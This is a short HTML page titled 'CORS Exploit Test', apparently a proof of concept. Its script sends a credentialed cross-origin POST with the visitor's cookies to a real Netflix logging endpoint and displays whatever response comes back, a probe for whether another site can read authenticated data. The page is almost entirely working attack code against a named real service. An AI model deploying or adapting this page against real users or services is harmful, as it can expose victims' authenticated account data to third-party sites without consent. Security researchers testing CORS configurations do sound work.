<!DOCTYPE html>
<html>
<body>
  <h2>CORS Exploit Test</h2>
  <div id="output">Testing...</div>
  <script>
    fetch("https://netflix.com/ichnaea/log", {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ dummy: "data" })
    })
    .then(res => res.text().then(text => {
      document.getElementById("output").innerText = `Status: ${res.status}\n\nResponse:\n${text}`;
    }))
    .catch(err => {
      document.getElementById("output").innerText = `Fetch failed:\n${err}`;
    });
  </script>
</body>
</html>
